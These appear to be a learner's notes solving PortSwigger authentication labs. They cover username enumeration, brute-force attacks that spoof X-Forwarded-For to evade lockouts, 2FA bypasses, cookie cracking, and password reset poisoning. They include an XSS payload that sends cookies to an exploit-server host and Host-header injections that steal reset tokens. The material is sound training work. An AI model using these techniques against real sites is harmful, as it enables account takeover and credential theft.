---
description: https://portswigger.net/web-security/authentication
---

# Authentication vulnerabilities

### Lab: Username enumeration via different responses

**Cluster Bomb ->**

• Candidate usernames • Candidate passwords

`username=§admin§&password=§password§`

All responses are most of 200.

for adkit user, we can see different than other the length 3392.

In response, we can see “Incorrect password” text.

**Sniper Attack ->**

• Candidate passwords

The response is 194 Length. 302 Found -> /my-account 302 Status - 112233

adkit:112233

### Lab: Username enumeration via subtly different responses

**Sniper Attack ->**

• Candidate usernames

`username=§admin§&password=password`

Filter - Invalid username or password. - Case sensitive, Negative Search anaheim

• Candidate passwords

`username=admin&password=§password§ `

302 Status - zxcvbnm

anaheim:zxcvbnm

### Lab: Username enumeration via response timing

This lab is vulnerable to username enumeration using its response times.

**Sniper Attack ->**

• Candidate usernames

`username=§admin§&password=password`

After 2 failed login attempts, we got an error: “You have made too many incorrect login attempts. Please try again in 30 minute(s).”.

To solve this,

Identify that the X-Forwarded-For header is supported, which allows you to spoof your IP address and bypass the IP-based brute-force protection. On the "Payloads" tab, select payload set 1. Select the "Numbers" payload type. Enter the range 1 - 100 and set the step to 1. Set the max fraction digits to 0. This will be used to spoof your IP.

We added the line to request.

X-Forwarded-For: 10.10.10.1

**Pitchfork Attack -> **

Number 1:1:101 (Max fraction digits:0)

`X-Forwarded-For: 10.20.30.§1§`

`username=§admin§&password=testtesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttest`

Continue experimenting with usernames and passwords. Pay particular attention to the response times. Notice that when the username is invalid, the response time is roughly the same. However, when you enter a valid username (your own), the response time is increased depending on the length of the password you entered.

When the attack finished, at the top of the dialog, click "Columns" and select the "Response received" and "Response completed" options. These two columns are now displayed in the results table.

access - 672, 673 - Longest one. still going up.

**Pitchfork Attack ->**&#x20;

Number 1:1:101 (Max fraction digits:0)

`X-Forwarded-For: 1.0.1.§1§`

`username=access&password=§admin§`

302 Found - zxcvbn / access:zxcvbn

### Lab: Broken brute-force protection, IP block

This lab is vulnerable due to a logic flaw in its password brute-force protection.

After 3 failed attemps: You have made too many incorrect login attempts. Please try again in 1 minute(s).

With Burp running, investigate the login page. Observe that your IP is temporarily blocked if you submit 3 incorrect logins in a row. However, notice that you can reset the counter for the number of failed login attempts by logging in to your own account before this limit is reached.

Add a list of payloads that alternates between wiener and carlos. Wiener is first and carlos follows. At least should be there are 100 times. And also passwords be like username list.

**Resource Pool -> Create new resource pool - Maximum concurrent requests: 1**

If you do not set the option, your brute force does not work properly. Because the default value is 10 requests. It can miss the order.

302 Found - love / carlos:love

### Lab: Username enumeration via account lock

**Cluster Bomb ->**

`username=§admin§&password=§asd§`

We identified anaheim username.

We tried to login times with bad creds and then we got the response.

You have made too many incorrect login attempts. Please try again in 1 minute(s).

**Sniper Attack ->**

`username=anaheim&password=§asd§`

3204 Length - baseball

Account is locked but password is true. So website does not return error code. It is a logic flaw.

Wait for a minute to allow the account lock to open then log in with anaheim:baseball

### Lab: Broken brute-force protection, multiple credentials per request

Login credentials are submitted in JSON format.

We can manipulate this JSON format. We can send an array of passwords for brute force.

```
"username" : "carlos",
"password" : [
    "123456",
    "password",
    ...
]
```

```
sed -i 's/.*/"&",/' passwords.txt | cat passwords.txt
```

Sending this request returns a "302" response code, which means that we managed to login in the website. We can click on "Show response in browser" to navigate to the webpage with the successful login.

### Lab: 2FA simple bypass

This lab's two-factor authentication can be bypassed.

First, you need to login as intended to see workflow. Make a note of the URL of account page. Try login with target user, at the verification step, we can change url to the noted. MFA step is not must, it is just directing to a page.

### Lab: 2FA broken logic

This lab's two-factor authentication is vulnerable due to its flawed logic.

2FA mechanism is working like this. Login with valid creds. The request is get after post request and there is a verify paramater what is generating MFA Code for specified user. After submitting MFA Code, the request is post and parameters are verify and MFA value.

So we need to do first generate temporary MFA code for carlos. And then bruteforce it. The order is,

* login valid creds - intercept request
* change verify value to carlos to generate MFA code for carlos
* Then submit an invalid code - intercept request
* Sniper attack with mfa-code value. (BruteForce)

```
GET /login2 HTTP/1.1
Host: ac451f791fa98f9bc06b238e001000fc.web-security-academy.net
Cookie: verify=carlos;

POST /login2 HTTP/1.1
Host: ac451f791fa98f9bc06b238e001000fc.web-security-academy.net
Cookie: verify=carlos;

mfa-code=§1234§
```

**Sniper ->**

mfa-code: 1397 - 302 Found - Length: 194

Show response in browser and then done.

### Lab: 2FA bypass using a brute-force attack

This lab's two-factor authentication is vulnerable to brute-forcing. You have already obtained a valid username and password, but do not have access to the user's 2FA verification code.

We need to investigate the 2FA verification process. We noticed this if we enter wrong code twice, we will be logged out. So we need to create a macro for bypass this situation.

For detailed information of creating the macro, you can see the solution of the lab.

Sequence of requests:

* GET /login
* POST /login
* GET /login2

**Sniper ->**

Number 0:1:9999 (Max fraction digits:0, Min/Max integer digits:4) - mfa-code parameter

Maximum concurrent requests option has to be 1 for using macro.

302 Found - Show response in browser and then done.

### Lab: Brute-forcing a stay-logged-in cookie

This lab allows users to stay logged in even after they close their browser session. The cookie used to provide this functionality is vulnerable to brute-forcing.

```
Cookie: stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw;

Base64 - wiener:51dc30ddc473d43a6011e9ebba6ca770
MD5 Password - peter:51DC30DDC473D43A6011E9EBBA6CA770
Stay LoggedIn Cookie: Base64 Encoded, username:md5(password)
```

1. In Burp Intruder, add a payload position to the stay-logged-in cookie and add your own password as a single payload.
2. Under "Payload processing", add the following rules in order. These rules will be applied sequentially to each payload before the request is submitted. • Hash: MD5 • Add prefix: carlos: • Encode: Base64-encode

Y2FybG9zOjg0ZDk2MTU2OGE2NTA3M2EzYmNmMGViMjE2YjJhNTc2 - valid

### Lab: Offline password cracking

This lab stores the user's password hash in a cookie. The lab also contains an XSS vulnerability in the comment functionality.

`Cookie: stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw; Base64 Encoded Cookie stay-logged-in=wiener:51dc30ddc473d43a6011e9ebba6ca770`

The comment functionality is vulnerable to XSS.

```
<script>document.location='//ac441f181f6374b1c0b70a03003c0050.web-security-academy.net/'+document.cookie</script>
```

Post a comment with this payload (own exploit server ID).

On the exploit server, open the access log.** You will see target's cookie value.**

Decoded -> carlos:26323c16d5f4dabff3bb136f2460a943 - Google it - onceuponatime

### Lab: Password reset broken logic

This lab's password reset functionality is vulnerable.

Forgot password -> Email client

https://ac8f1f081e8f4f81c0fb05ab00cb0042.web-security-academy.net/forgot-password?temp-forgot-password-token=7breF0xOthS6aVfgd0LfvZpbxnnaEwAO

```
POST /forgot-password?temp-forgot-password-token= HTTP/1.1
temp-forgot-password-token=&username=carlos&new-password-1=peter&new-password-2=peter
```

We deleted token value, and then change the username. The website does not control token value is exist. There is a weakness. We can change any user's password which we want.

## Password reset poisoning

[https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning)

Password reset poisoning is a technique whereby an attacker manipulates a vulnerable website into generating a password reset link pointing to a domain under their control. This behavior can be leveraged to steal the secret tokens required to reset arbitrary users' passwords and, ultimately, compromise their accounts.

### Lab: Basic password reset poisoning&#x20;

We can steal token with Host Header:

`Host: exploit-ac431f391f42e4f1c09819bf014000e2.web-security-academy.net/exploit`

### Lab: Password reset poisoning via middleware&#x20;

We can steal token with adding X-Forwarded-For Header:

`X-Forwarded-For: exploit-ac431f391f42e4f1c09819bf014000e2.web-security-academy.net/exploit`

### Lab: Password reset poisoning via dangling markup

We can steal password info with adding dangling markup to Host Header:

`Host: acd41f2d1faa27d0c019a1a800c5001a.web-security-academy.net:'<a href="//exploit-acaa1f361f6d271fc04fa17a012100c4.web-security-academy.net/exploit?`
